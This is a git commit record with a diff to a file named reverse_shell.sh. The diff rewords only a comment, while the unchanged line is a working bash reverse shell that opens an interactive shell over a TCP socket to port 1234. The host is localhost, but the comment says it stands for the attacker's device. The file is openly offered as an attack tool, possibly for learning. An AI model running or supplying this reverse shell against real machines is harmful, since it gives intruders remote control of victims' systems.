16e1a23093505eaa3c990b9d07743b4c3ec8fec7
betoayza <aaayza@gmail.com>
2023-07-11 21:41:30 -0300

    First commit

--- reverse_shell.sh
+++ reverse_shell.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-# Opens a interactive BASH connecting to port 1234 in the attacker device by creatting a TCP socket
+# Victim target opens a interactive BASH in the attacker device by connecting to port 1234 through a TCP socket creation
 bash -i >& /dev/tcp/localhost/1234 0>&1
